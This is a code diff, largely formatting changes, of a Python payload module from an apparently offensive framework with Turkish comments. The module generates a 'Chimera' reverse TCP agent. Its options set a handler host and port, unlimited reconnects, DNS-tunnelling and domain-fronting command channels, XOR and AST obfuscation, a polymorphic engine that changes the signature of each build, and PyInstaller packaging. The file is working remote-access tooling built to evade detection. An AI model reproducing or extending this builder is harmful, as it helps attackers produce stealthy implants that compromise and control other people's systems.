@@ -1,20 +1,27 @@
-from core.module import BaseModule
-from core.option import Option
-from typing import Dict, Any
 import os
 import sys
+from typing import Any
+
+from core.module import BaseModule
+from core.option import Option
 
 # Builder çekirdek kütüphanesini içe aktarmaya çalış
 # (Builder kendi içinde obfuscator'ı da yönetir)
 try:
     from build.chimera_builder import build_payload, print_build_report
+
     _BUILDER_AVAILABLE = True
 except ImportError:
-    proot = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
+    proot = os.path.dirname(
+        os.path.dirname(
+            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        )
+    )
     if proot not in sys.path:
         sys.path.insert(0, proot)
     try:
         from build.chimera_builder import build_payload, print_build_report
+
         _BUILDER_AVAILABLE = True
     except ImportError:
         _BUILDER_AVAILABLE = False
@@ -22,6 +29,7 @@ except ImportError:
 # Obfuscation raporu için (sadece raporlama amaçlı)
 try:
     from build.chimera_obfuscator import print_obfuscation_report
+
     _OBFUSCATOR_AVAILABLE = True
 except ImportError:
     _OBFUSCATOR_AVAILABLE = False
@@ -33,26 +41,79 @@ class Payload(BaseModule):
     Gelişmiş Chimera ajanını üretir. Sadece Python 3 standart kütüphaneleri kullanır.
     Builder + Obfuscation pipeline'ı chimera_builder üzerinden yönetilir.
     """
+
     Name = "Chimera Core Agent"
-    Description = "Chimera reverse TCP ajanı. Builder + Obfuscation altyapısını destekler."
+    Description = (
+        "Chimera reverse TCP ajanı. Builder + Obfuscation altyapısını destekler."
+    )
     Author = "Mahmut P."
     Category = "payloads"
 
     def __init__(self):
         super().__init__()
         self.Options = {
-            "LHOST":           Option("LHOST",           "127.0.0.1", True,  "Bağlanılacak IP (Handler)."),
-            "LPORT":           Option("LPORT",           4444,        True,  "Bağlanılacak Port."),
-            "OUTPUT":          Option("OUTPUT",          "",          False, "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).", completion_dir="."),
-            "RECONNECT_DELAY": Option("RECONNECT_DELAY", 5,           False, "Yeniden bağlanma bekleme süresi (sn)."),
-            "MAX_RECONNECT":   Option("MAX_RECONNECT",   -1,          False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
-            "CHANNEL_TYPE":    Option("CHANNEL_TYPE",    "https",     False, "İletişim kanalı tipi.", choices=["https", "dns", "fronting", "auto"]),
-            "DNS_DOMAIN":      Option("DNS_DOMAIN",      "",          False, "DNS tünelleme domain'i (ör: c2.example.com)."),
-            "FRONTING_DOMAIN": Option("FRONTING_DOMAIN",  "",          False, "Domain fronting CDN host'u (ör: cdn.example.com)."),
-            "STRIP_COMMENTS":  Option("STRIP_COMMENTS",  False,       False, "Yorum satırlarını temizle.", choices=[True, False]),
-            "OBFUSCATE":       Option("OBFUSCATE",       False,       False, "AST rename + XOR string şifreleme + junk code uygula.", choices=[True, False]),
-            "POLYMORPHIC":     Option("POLYMORPHIC",     False,       False, "Polimorfik engine uygula (her build farklı imza üretir).", choices=[True, False]),
-            "BUILD":           Option("BUILD",           False,       False, "PyInstaller ile çalıştırılabilir ikili (binary) dosyaya dönüştür.", choices=[True, False]),
+            "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Handler)."),
+            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: /tmp/chimera.py).",
+                completion_dir=".",
+            ),
+            "RECONNECT_DELAY": Option(
+                "RECONNECT_DELAY", 5, False, "Yeniden bağlanma bekleme süresi (sn)."
+            ),
+            "MAX_RECONNECT": Option(
+                "MAX_RECONNECT",
+                -1,
+                False,
+                "Maksimum bağlanma denemesi (-1 = sınırsız).",
+            ),
+            "CHANNEL_TYPE": Option(
+                "CHANNEL_TYPE",
+                "https",
+                False,
+                "İletişim kanalı tipi.",
+                choices=["https", "dns", "fronting", "auto"],
+            ),
+            "DNS_DOMAIN": Option(
+                "DNS_DOMAIN", "", False, "DNS tünelleme domain'i (ör: c2.example.com)."
+            ),
+            "FRONTING_DOMAIN": Option(
+                "FRONTING_DOMAIN",
+                "",
+                False,
+                "Domain fronting CDN host'u (ör: cdn.example.com).",
+            ),
+            "STRIP_COMMENTS": Option(
+                "STRIP_COMMENTS",
+                False,
+                False,
+                "Yorum satırlarını temizle.",
+                choices=[True, False],
+            ),
+            "OBFUSCATE": Option(
+                "OBFUSCATE",
+                False,
+                False,
+                "AST rename + XOR string şifreleme + junk code uygula.",
+                choices=[True, False],
+            ),
+            "POLYMORPHIC": Option(
+                "POLYMORPHIC",
+                False,
+                False,
+                "Polimorfik engine uygula (her build farklı imza üretir).",
+                choices=[True, False],
+            ),
+            "BUILD": Option(
+                "BUILD",
+                False,
+                False,
+                "PyInstaller ile çalıştırılabilir ikili (binary) dosyaya dönüştür.",
+                choices=[True, False],
+            ),
         }
 
     def _to_bool(self, val) -> bool:
@@ -72,29 +133,31 @@ class Payload(BaseModule):
         Returns:
             dict: {success, code, output_path, error, stats, obfuscation_stats}
         """
-        lhost           = self.Options["LHOST"].value
-        lport           = self.Options["LPORT"].value
-        output          = self.Options["OUTPUT"].value
+        lhost = self.Options["LHOST"].value
+        lport = self.Options["LPORT"].value
+        output = self.Options["OUTPUT"].value
         reconnect_delay = int(self.Options["RECONNECT_DELAY"].value or 5)
-        max_reconnect   = int(self.Options["MAX_RECONNECT"].value or -1)
-        channel_type    = str(self.Options["CHANNEL_TYPE"].value or "https")
-        dns_domain      = str(self.Options["DNS_DOMAIN"].value or "")
+        max_reconnect = int(self.Options["MAX_RECONNECT"].value or -1)
+        channel_type = str(self.Options["CHANNEL_TYPE"].value or "https")
+        dns_domain = str(self.Options["DNS_DOMAIN"].value or "")
         fronting_domain = str(self.Options["FRONTING_DOMAIN"].value or "")
-        strip_comments  = self._to_bool(self.Options["STRIP_COMMENTS"].value)
-        obfuscate       = self._to_bool(self.Options["OBFUSCATE"].value)
-        polymorphic     = self._to_bool(self.Options["POLYMORPHIC"].value)
-        build_bin       = self._to_bool(self.Options["BUILD"].value)
+        strip_comments = self._to_bool(self.Options["STRIP_COMMENTS"].value)
+        obfuscate = self._to_bool(self.Options["OBFUSCATE"].value)
+        polymorphic = self._to_bool(self.Options["POLYMORPHIC"].value)
+        build_bin = self._to_bool(self.Options["BUILD"].value)
 
         agent_path = os.path.join(
-            os.path.dirname(os.path.abspath(__file__)),
-            "agent.py"
+            os.path.dirname(os.path.abspath(__file__)), "agent.py"
         )
 
         if not _BUILDER_AVAILABLE:
             return {
                 "success": False,
                 "error": "[!] build.chimera_builder yüklenemedi!",
-                "code": "", "output_path": None, "stats": {}, "obfuscation_stats": {}
+                "code": "",
+                "output_path": None,
+                "stats": {},
+                "obfuscation_stats": {},
             }
 
         result = build_payload(
@@ -116,7 +179,7 @@ class Payload(BaseModule):
 
         return result
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         """Payload oluştur, opsiyonel olarak obfuscate et, raporla."""
         if not _BUILDER_AVAILABLE:
             print("[!] HATA: build/chimera_builder.py bulunamadı.")
@@ -130,10 +193,9 @@ class Payload(BaseModule):
 
             # Obfuscation raporu (varsa)
             if result.get("obfuscation_stats") and _OBFUSCATOR_AVAILABLE:
-                print_obfuscation_report({
-                    "success": True,
-                    "stats": result["obfuscation_stats"]
-                })
+                print_obfuscation_report(
+                    {"success": True, "stats": result["obfuscation_stats"]}
+                )
 
             if result.get("output_path"):
                 print(f"[+] Payload kaydedildi: {result['output_path']}")
